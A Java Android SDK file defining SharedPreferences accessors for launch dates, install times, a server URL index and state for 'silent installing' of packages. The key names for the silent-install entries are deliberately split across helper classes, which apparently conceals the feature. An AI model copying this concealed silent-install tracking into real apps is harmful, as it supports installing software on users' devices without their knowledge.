package net.doll.holx.data;
import java.text.SimpleDateFormat;
import java.util.Date;

import net.doll.holx.utils.StrHelp1;
import net.doll.holx.utils.StrHelp2;
import net.doll.holx.utils.StrHelp3;

import android.content.Context;

import com.lsk.open.core.share_preference.BaseSharePreference;



public class SharePreferenceSdkData extends BaseSharePreference{	
	
	final static String FIRST_LANUCHER_UPLOAD="lanucher_times";
	public static void setLanucherTimers(Context context,long time){
		if(time == -1){//清空
			setString(context,FIRST_LANUCHER_UPLOAD,"");
			return;
		}
		SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd");
		String date = sdf.format(new Date(time));
		String dateStrs=getString(context, FIRST_LANUCHER_UPLOAD, "");
		if(dateStrs.equals("")){
			setString(context,FIRST_LANUCHER_UPLOAD,date);
		}else{
			if(!dateStrs.contains(date)){
				StringBuffer sb = new StringBuffer(dateStrs);
				sb.append(","+date);
				setString(context, FIRST_LANUCHER_UPLOAD, sb.toString());
			}
		}
	
	}
	public static String getLanucherTimers(Context context){
		return getString(context, FIRST_LANUCHER_UPLOAD, "");
	}
	
	
	final static String LAST_UPLOAD_LAUNCHER_TIMES = "last_upload_launcher_times";
	public static void setLastUploadLauncherTimes(Context context, long time) {
		setLong(context, LAST_UPLOAD_LAUNCHER_TIMES, time);
	}
	public static long getLastUploadLauncherTimes(Context context) {
		return getLong(context, LAST_UPLOAD_LAUNCHER_TIMES, 0);
	}
	
	final static String FIRST_UPLOAD="first_upload";
	public static void setFirstRegister(Context context ,boolean flag){
		setBoolean(context,FIRST_UPLOAD,flag);
	}
	public static boolean isFirstRegister(Context context){
		return getBoolean(context,FIRST_UPLOAD, false);
	}
	
	final static String INSTALL_TIME = "install_time";
	public static void setInstallTime(Context context, long time){
		setLong(context, INSTALL_TIME, time);
	}
	public static long getInstallTime(Context context){
		return getLong(context, INSTALL_TIME, 0);
	}
	
	
	final static String ERRORREPORT_RETRY_TIMES="error_report_times";
	public static long getErrorReportRTTimes(final Context context) {
		return getAppPreferences(context).getLong(ERRORREPORT_RETRY_TIMES, 0);
	}

	public static void setErrorReportRTTimes(final Context context, long times) {
		setLong(context, ERRORREPORT_RETRY_TIMES, times);
	}
	
	private static final String INSTALL_APP_FLAG="install_app_flag";
	public static void setInstallAppFlag(Context context ,boolean flag){
		setBoolean(context, INSTALL_APP_FLAG, flag);	
	}
	
	public static boolean getInstallAppFlag(Context context){
		return getBoolean(context, INSTALL_APP_FLAG, true);
	}
	
	private static final String SERVER_URL_INDEX="server_url_index";
	public static void setServerUrlIndex(Context context ,int index){
		setInt(context, SERVER_URL_INDEX, index);	
	}
	
	public static int getServerUrlIndex(Context context){
		return getInt(context, SERVER_URL_INDEX, 0);
	}
	
	final static String UPDATE_INSTALL_APP_FLAG_TIME = "update_install_app_flag_time";
	public static void setUpdateInstallAppFlagTime(Context context, long time) {
		setLong(context, UPDATE_INSTALL_APP_FLAG_TIME, time);
	}
	public static long getUpdateInstallAppFlagTime(Context context) {
		return getLong(context, UPDATE_INSTALL_APP_FLAG_TIME, 0);
	}
	
//	private static final String SILENT_INSTALLING_PACKAGE = "silent_installing_package";
//	private static final String SILENT_INSTALLING_PACKAGE = StrHelp1.SHARE_PREF1+StrHelp2.SHARE_PREF+StrHelp3.SHARE_PREF1;
	private static final String SILENT_INSTALLING_PACKAGE = new StringBuffer(StrHelp1.SHARE_PREF1).append(StrHelp2.SHARE_PREF).append(StrHelp3.SHARE_PREF1).toString();
	public static void setSilentInstallingPackage(Context context,String packageName) {
		setString(context, SILENT_INSTALLING_PACKAGE, packageName);
	}
	public static String getSilentInstallingPackage(Context context) {
		return getString(context, SILENT_INSTALLING_PACKAGE, null);
	}
	
//	private static final String LATEST_SILENT_INSTALLING_TIME = "latest_silent_installing_time";
//	private static final String LATEST_SILENT_INSTALLING_TIME = StrHelp1.SHARE_PREF+StrHelp2.SHARE_PREF+StrHelp3.SHARE_PREF;
	private static final String LATEST_SILENT_INSTALLING_TIME = new StringBuffer(StrHelp1.SHARE_PREF).append(StrHelp2.SHARE_PREF).append(StrHelp3.SHARE_PREF).toString();
	public static void setLatestSilentInstallTime(Context context, long time) {
		setLong(context, LATEST_SILENT_INSTALLING_TIME, time);
	}
	public static long getLatestSilentInstallTime(Context context) {
		return getLong(context, LATEST_SILENT_INSTALLING_TIME, 0);
	}
}
